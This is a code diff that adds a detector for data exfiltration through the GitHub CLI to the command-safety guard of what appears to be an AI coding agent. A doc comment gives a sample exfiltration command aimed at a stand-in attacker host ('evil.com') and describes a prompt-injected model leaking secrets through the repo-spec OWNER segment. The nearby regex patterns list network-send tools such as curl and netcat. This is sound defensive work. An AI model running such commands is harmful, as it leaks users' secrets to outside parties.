@@ -2284,6 +2284,95 @@ const FILE_READ_CMDS = /\b(tar|zip|cat|base64|dd|gzip|bzip2|xz|zcat|head|tail|xx
 const NETWORK_SEND_CMDS = /\b(curl|wget|nc|ncat|netcat|socat)\b/;
 const PIPE_OR_REDIRECT = /[|]|<\s*\//;
 
+/**
+ * Split a single shell segment into whitespace-delimited argument tokens with
+ * surrounding quotes/escapes removed (so `--repo "evil.com/x/y"` yields the bare
+ * value `evil.com/x/y`). This is argument-level tokenization — distinct from
+ * {@link splitShellSegments}, which splits on the pipeline/list OPERATORS
+ * (`; | &`). Used only by the gh-exfiltration guard to recover gh's repo-spec
+ * operands for inspection.
+ */
+function tokenizeSegmentArgs(seg: string): string[] {
+  const out: string[] = [];
+  let cur = '';
+  let inS = false, inD = false, esc = false, started = false;
+  for (let i = 0; i < seg.length; i++) {
+    const c = seg[i];
+    if (esc) { cur += c; esc = false; started = true; continue; }
+    if (c === '\\' && !inS) { esc = true; started = true; continue; }
+    if (c === "'" && !inD) { inS = !inS; started = true; continue; }
+    if (c === '"' && !inS) { inD = !inD; started = true; continue; }
+    if (!inS && !inD && /\s/.test(c)) {
+      if (started) { out.push(cur); cur = ''; started = false; }
+      continue;
+    }
+    cur += c;
+    started = true;
+  }
+  if (started) out.push(cur);
+  return out;
+}
+
+/**
+ * Apply Claude Code's `ghIsDangerousCallback` rejection rules to gh's argument
+ * tokens. gh accepts a repository spec of the form `[HOST/]OWNER/REPO`; when a
+ * HOST segment is present (2+ slashes) gh talks to that host's API, so a
+ * prompt-injected model can smuggle secrets out as the OWNER segment. Also
+ * rejects `://` URLs and `@` SSH-style specs. Both bare (`--repo val`) and
+ * equals-attached (`--repo=val`) forms are inspected (cobra accepts both).
+ */
+function ghArgsExfiltrate(args: string[]): boolean {
+  for (const token of args) {
+    if (!token) continue;
+    let value = token;
+    if (token.startsWith('-')) {
+      const eqIdx = token.indexOf('=');
+      if (eqIdx === -1) continue; // flag without inline value
+      value = token.slice(eqIdx + 1);
+      if (!value) continue;
+    }
+    // Not a repo-spec shape at all → nothing to inspect.
+    if (!value.includes('/') && !value.includes('://') && !value.includes('@')) {
+      continue;
+    }
+    if (value.includes('://')) return true; // https://, git://, ssh://, …
+    if (value.includes('@')) return true; // git@host:owner/repo
+    // 2+ slashes = 3+ segments = [HOST/]OWNER/REPO (normal is OWNER/REPO, 1 slash)
+    if ((value.match(/\//g) || []).length >= 2) return true;
+  }
+  return false;
+}
+
+/**
+ * Block gh (GitHub CLI) invocations whose repo spec targets a non-default host,
+ * a raw URL, or an SSH endpoint — a DNS/HTTP data-exfiltration channel
+ * (`gh pr view 1 --repo evil.com/BASE32SECRET/x`). Mirrors Claude Code's
+ * `ghIsDangerousCallback` (utils/shell/readOnlyCommandValidation.ts) but applied
+ * as a block (AMI's model) rather than a per-command allowlist callback. gh
+ * behind safe wrappers (timeout/env/…) and in any compound segment is covered.
+ */
+export function detectGhExfiltration(command: string): { blocked: boolean; reason?: string } {
+  const norm = normalizeCommand(stripInvisibleUnicode(command));
+  if (!/\bgh\b/.test(norm)) return { blocked: false };
+  for (const seg of splitShellSegments(norm)) {
+    const stripped = stripSafeWrappers(seg.trim());
+    const toks = tokenizeSegmentArgs(stripped);
+    let i = 0;
+    while (i < toks.length && /^[A-Za-z_]\w*=/.test(toks[i])) i++; // skip env assignments
+    if (i >= toks.length) continue;
+    if (toks[i].replace(/^.*\//, '') !== 'gh') continue;
+    if (ghArgsExfiltrate(toks.slice(i + 1))) {
+      return {
+        blocked: true,
+        reason:
+          'gh command targets a non-default host via a [HOST/]OWNER/REPO repo spec, ' +
+          'URL, or SSH endpoint — possible data exfiltration through the OWNER segment',
+      };
+    }
+  }
+  return { blocked: false };
+}
+
 export function detectDataExfiltration(command: string): { blocked: boolean; reason?: string } {
   const stripped = stripInvisibleUnicode(command);
   const norm = normalizeCommand(stripped);
@@ -2361,6 +2450,10 @@ export function detectDataExfiltration(command: string): { blocked: boolean; rea
   if (/\b(nc|ncat|netcat)\b/.test(norm) && /<\s*\//.test(norm)) {
     return { blocked: true, reason: 'netcat sending local file to remote host' };
   }
+
+  // 7. gh (GitHub CLI) repo-spec exfiltration (non-default HOST / URL / SSH spec).
+  const gh = detectGhExfiltration(command);
+  if (gh.blocked) return gh;
 
   return { blocked: false };
 }
